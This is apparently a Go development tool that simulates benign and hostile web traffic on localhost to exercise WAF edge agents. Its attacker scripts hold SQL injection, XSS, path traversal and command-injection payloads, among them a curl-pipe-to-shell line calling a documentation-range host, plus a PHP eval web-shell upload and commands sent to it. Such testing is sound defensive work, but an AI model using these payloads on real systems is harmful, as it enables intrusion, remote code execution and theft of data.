// devsim is a development tool, not part of the product. It provides the two things a local stack lacks:
//
//	devsim upstream --listen :9000        a small web app for the edge agents to protect
//	devsim traffic --targets http://127.0.0.1:9081,http://127.0.0.1:9082
//	                                      real HTTP requests, benign and hostile, sent through the agents
//
// Every request is inspected by the real Coraza engine on the agent; nothing here writes to a database.
// Simulated client addresses use the RFC 5737 documentation ranges and travel in X-Forwarded-For, so the agents
// must be started with --trusted-proxies 127.0.0.1/32 for them to count.
package main

import (
	"bytes"
	"context"
	"flag"
	"fmt"
	"io"
	"log/slog"
	"math/rand/v2"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"strings"
	"time"
)

func main() {
	if len(os.Args) < 2 {
		fmt.Fprintln(os.Stderr, "usage: devsim upstream|traffic [flags]")
		os.Exit(2)
	}
	fs := flag.NewFlagSet(os.Args[1], flag.ExitOnError)
	switch os.Args[1] {
	case "upstream":
		listen := fs.String("listen", "127.0.0.1:9000", "listen address")
		fs.Parse(os.Args[2:])
		slog.Info("demo upstream listening", "addr", *listen)
		if err := http.ListenAndServe(*listen, upstream()); err != nil {
			slog.Error("upstream", "err", err)
			os.Exit(1)
		}
	case "traffic":
		targets := fs.String("targets", "http://127.0.0.1:9081", "comma-separated edge agent URLs")
		rps := fs.Float64("rps", 12, "benign requests per second")
		fs.Parse(os.Args[2:])
		ctx, stop := signal.NotifyContext(context.Background(), os.Interrupt)
		defer stop()
		traffic(ctx, strings.Split(*targets, ","), *rps)
	default:
		fmt.Fprintln(os.Stderr, "usage: devsim upstream|traffic [flags]")
		os.Exit(2)
	}
}

// ---------- Demo upstream ----------

func upstream() http.Handler {
	mux := http.NewServeMux()
	page := func(body string) http.HandlerFunc {
		return func(w http.ResponseWriter, r *http.Request) {
			io.Copy(io.Discard, r.Body)
			w.Header().Set("Content-Type", "text/html; charset=utf-8")
			fmt.Fprintf(w, "<!doctype html><title>%s</title><p>%s</p>", r.Host, body)
		}
	}
	jsonOK := func(w http.ResponseWriter, r *http.Request) {
		io.Copy(io.Discard, r.Body)
		w.Header().Set("Content-Type", "application/json")
		io.WriteString(w, `{"ok":true}`)
	}
	for _, p := range []string{"/{$}", "/products", "/products/search", "/cart", "/checkout", "/account/profile", "/reports", "/blog", "/wp-admin/post.php"} {
		mux.HandleFunc(p, page("ok"))
	}
	for _, p := range []string{"/api/v1/login", "/api/v1/search", "/api/v1/users", "/api/v1/orders", "/api/v1/upload"} {
		mux.HandleFunc(p, jsonOK)
	}
	// Two deliberately bad endpoints so outbound rules have something to catch.
	mux.HandleFunc("/debug/query", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		io.WriteString(w, "<p>You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''' at line 1</p>")
	})
	mux.HandleFunc("/uploads/cache.php", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html; charset=utf-8")
		io.WriteString(w, "<html><head><title>r57 Shell Version 1.40</title></head><body>uid=33(www-data) gid=33(www-data)</body></html>")
	})
	return mux
}

// ---------- Traffic ----------

type request struct {
	method, host, path, body, ua string
}

type step struct {
	reqs  []request
	n     int           // requests in this step
	every time.Duration // gap between them
}

type actor struct {
	name  string
	ips   []string
	steps []step
	rest  time.Duration // pause before the script repeats
}

const (
	browser = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36"
	form    = "application/x-www-form-urlencoded"
)

func get(host, path string) request        { return request{"GET", host, path, "", browser} }
func post(host, path, body string) request { return request{"POST", host, path, body, browser} }
func ua(r request, agent string) request   { r.ua = agent; return r }
func q(s string) string                    { return url.QueryEscape(s) }

var actors = []actor{
	{ // Scanner that finds a login form and goes for SQL injection: Recon -> Exploitation.
		name: "sqli", ips: []string{"203.0.113.24"}, rest: 9 * time.Minute,
		steps: []step{
			{n: 6, every: 2 * time.Second, reqs: []request{ua(get("api.domain.com", "/.env"), "sqlmap/1.8.4#stable (https://sqlmap.org)"), ua(get("api.domain.com", "/.git/config"), "sqlmap/1.8.4#stable (https://sqlmap.org)"), ua(get("api.domain.com", "/admin/"), "Nikto/2.5.0")}},
			{n: 14, every: 3 * time.Second, reqs: []request{
				post("api.domain.com", "/api/v1/login", "username="+q("' OR '1'='1")+"&password=x"),
				post("api.domain.com", "/api/v1/login", "username="+q("admin' UNION SELECT username, password FROM users--")+"&password=x"),
				get("api.domain.com", "/api/v1/search?filter="+q("1; DROP TABLE orders--")),
			}},
		},
	},
	{ // Reflected XSS probing on the storefront.
		name: "xss", ips: []string{"198.51.100.61"}, rest: 12 * time.Minute,
		steps: []step{{n: 9, every: 4 * time.Second, reqs: []request{
			get("shop.domain.com", "/products/search?q="+q("<script>alert(document.cookie)</script>")),
			get("shop.domain.com", "/products/search?q="+q(`"><img src=x onerror=alert(1)>`)),
		}}},
	},
	{ // Path traversal and command injection against the portal, from a /24 that rotates addresses.
		name: "lfi-rce", ips: []string{"192.0.2.77", "192.0.2.78", "192.0.2.80"}, rest: 15 * time.Minute,
		steps: []step{
			{n: 5, every: 3 * time.Second, reqs: []request{get("portal.domain.com", "/reports?file="+q("../../../../etc/passwd")), get("portal.domain.com", "/reports?file="+q("/proc/self/environ"))}},
			{n: 6, every: 4 * time.Second, reqs: []request{post("portal.domain.com", "/account/profile", "name="+q("x; cat /etc/passwd")), post("portal.domain.com", "/account/profile", "name="+q("$(curl http://203.0.113.9/x.sh|sh)"))}},
		},
	},
	{ // Full chain on the CMS: probe, PHP upload, then driving the web shell and pulling data out.
		name: "webshell", ips: []string{"203.0.113.140"}, rest: 20 * time.Minute,
		steps: []step{
			{n: 4, every: 2 * time.Second, reqs: []request{ua(get("cms.domain.com", "/wp-login.php"), "WPScan v3.8.25"), ua(get("cms.domain.com", "/xmlrpc.php"), "WPScan v3.8.25")}},
			{n: 2, every: 5 * time.Second, reqs: []request{post("cms.domain.com", "/api/v1/upload", "file="+q("<?php @eval($_POST['x']); ?>"))}},
			{n: 2, every: 6 * time.Second, reqs: []request{get("cms.domain.com", "/uploads/cache.php")}},
			{n: 5, every: 8 * time.Second, reqs: []request{get("cms.domain.com", "/uploads/cache.php?c="+q("cat /etc/passwd")), get("cms.domain.com", "/uploads/cache.php?c="+q("uname -a; id"))}},
			{n: 3, every: 7 * time.Second, reqs: []request{get("cms.domain.com", "/debug/query?id="+q("1'"))}},
		},
	},
}

var benign = []request{
	get("api.domain.com", "/api/v1/users?page=2"), get("api.domain.com", "/api/v1/orders?status=open"), post("api.domain.com", "/api/v1/login", "username=dewi&password=correct-horse"),
	get("shop.domain.com", "/"), get("shop.domain.com", "/products"), get("shop.domain.com", "/products/search?q=running+shoes"), get("shop.domain.com", "/cart"),
	get("portal.domain.com", "/account/profile"), get("portal.domain.com", "/reports?file=q3-summary.pdf"), get("cms.domain.com", "/blog"), get("cms.domain.com", "/"),
}

func send(ctx context.Context, client *http.Client, target, ip string, r request) {
	req, err := http.NewRequestWithContext(ctx, r.method, strings.TrimRight(target, "/")+r.path, bytes.NewReader([]byte(r.body)))
	if err != nil {
		return
	}
	req.Host = r.host
	req.Header.Set("User-Agent", r.ua)
	req.Header.Set("Accept", "text/html,application/json;q=0.9,*/*;q=0.8")
	req.Header.Set("X-Forwarded-For", ip)
	if r.body != "" {
		req.Header.Set("Content-Type", form)
	}
	res, err := client.Do(req)
	if err != nil {
		return
	}
	io.Copy(io.Discard, res.Body)
	res.Body.Close()
}

func sleep(ctx context.Context, d time.Duration) bool {
	select {
	case <-ctx.Done():
		return false
	case <-time.After(d):
		return true
	}
}

func traffic(ctx context.Context, targets []string, rps float64) {
	client := &http.Client{Timeout: 10 * time.Second}
	target := func() string { return targets[rand.IntN(len(targets))] }
	for i, a := range actors {
		go func() {
			if !sleep(ctx, time.Duration(5+i*20)*time.Second) {
				return
			}
			for ctx.Err() == nil {
				slog.Info("actor starting", "actor", a.name)
				for _, st := range a.steps {
					for k := 0; k < st.n; k++ {
						send(ctx, client, target(), a.ips[k%len(a.ips)], st.reqs[k%len(st.reqs)])
						if !sleep(ctx, st.every+time.Duration(rand.IntN(800))*time.Millisecond) {
							return
						}
					}
				}
				if !sleep(ctx, a.rest) {
					return
				}
			}
		}()
	}
	slog.Info("sending traffic", "targets", targets, "benign_rps", rps)
	gap := time.Duration(float64(time.Second) / rps)
	for sleep(ctx, gap) {
		ip := fmt.Sprintf("198.51.100.%d", 130+rand.IntN(100)) // ordinary visitors
		go send(ctx, client, target(), ip, benign[rand.IntN(len(benign))])
	}
}
